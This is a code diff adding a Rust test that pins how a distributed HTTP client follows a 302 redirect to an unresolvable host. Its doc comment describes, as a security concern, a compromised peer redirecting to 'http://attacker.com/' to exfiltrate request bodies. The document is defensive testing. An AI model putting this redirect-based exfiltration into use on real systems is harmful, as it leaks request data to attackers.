@@ -4166,6 +4166,81 @@ KBAhs4snj5QspGFqkazmIw==
         });
     }
 
+    /// ft-xbnl0.2.4 tick 349: 3xx redirect — observed-behavior snapshot.
+    ///
+    /// Discovery during development: `DistributedHttpClient` (built on
+    /// the default asupersync HTTP client config) currently **follows
+    /// 3xx redirects transparently**. A 302 with a `Location:` header
+    /// pointing at an unresolvable host causes the client to attempt
+    /// to connect to that location, which returns `Err(ConnectError)`.
+    ///
+    /// This test pins that observed behavior — a 302 with an invalid
+    /// Location returns `Err(ConnectError-shaped error)`, NOT `Ok(302)`.
+    ///
+    /// **SECURITY NOTE**: transparent redirect following is a concern
+    /// for a distributed RPC client where URLs are supposed to point
+    /// at trusted peer nodes. A compromised peer could respond 302 →
+    /// `Location: http://attacker.com/` and exfiltrate the next
+    /// request's body there. The HTTP-client layer should probably
+    /// default to `RedirectPolicy::none()` for DistributedHttpClient
+    /// so the decision to follow is explicit at the caller. That's
+    /// a follow-up bead (not ft-xbnl0.2.4 scope — this bead is about
+    /// migrating OFF tokio, not about client policy defaults).
+    ///
+    /// The current test pins the status quo so:
+    /// 1. Any caller relying on the current "Err on redirect"
+    ///    behavior (e.g. treating it as unreachable) stays working.
+    /// 2. A future change to `RedirectPolicy::none()` will cause this
+    ///    test to fail with a clear signal — update the test to
+    ///    assert `resp.status == 302` and the security concern is
+    ///    resolved.
+    #[cfg(feature = "distributed")]
+    #[test]
+    fn distributed_http_client_3xx_redirect_current_behavior_snapshot() {
+        run_async_test(async {
+            use asupersync::io::AsyncWriteExt as _;
+
+            let listener = TcpListener::bind("127.0.0.1:0").await.expect("bind");
+            let addr = listener.local_addr().expect("addr");
+
+            let server_task = crate::runtime_compat::task::spawn(async move {
+                let (mut stream, _) = listener.accept().await.expect("accept");
+                let mut buf = [0u8; 1024];
+                let _ = stream.read(&mut buf).await;
+                // 302 Found with a Location pointing at an unresolvable host.
+                let response = b"HTTP/1.1 302 Found\r\n\
+                                 Location: http://does-not-resolve.invalid./\r\n\
+                                 Content-Length: 0\r\n\r\n";
+                stream.write_all(response).await.expect("write response");
+                stream.shutdown(std::net::Shutdown::Both).expect("shutdown");
+            });
+
+            let client = DistributedHttpClient::plaintext();
+            let cx = asupersync::cx::Cx::for_testing();
+            let url = format!("http://127.0.0.1:{}/origin", addr.port());
+
+            let result = client.get(&cx, &url).await;
+
+            // Current behavior: client follows redirect, hits DNS
+            // failure on the invalid Location, returns Err.
+            //
+            // If a future commit configures RedirectPolicy::none() at
+            // the DistributedHttpClient construction site, this test
+            // will flip to passing an Err-shaped assertion — that's
+            // the intended trigger to update this test to assert
+            // `resp.status == 302` for the security-improved path.
+            assert!(
+                result.is_err(),
+                "current behavior: 302 with unresolvable Location → Err(ConnectError-shaped). \
+                 If this assertion flips, RedirectPolicy likely changed — update the test to \
+                 assert status == 302 and the transparent-redirect security concern is \
+                 resolved. got: {result:?}"
+            );
+
+            server_task.await.expect("join");
+        });
+    }
+
     /// ft-xbnl0.2.4 tick 345: Server closes mid-response → client returns Err.
     ///
     /// Pins that the client returns `Err` (not a truncated `Ok` and not
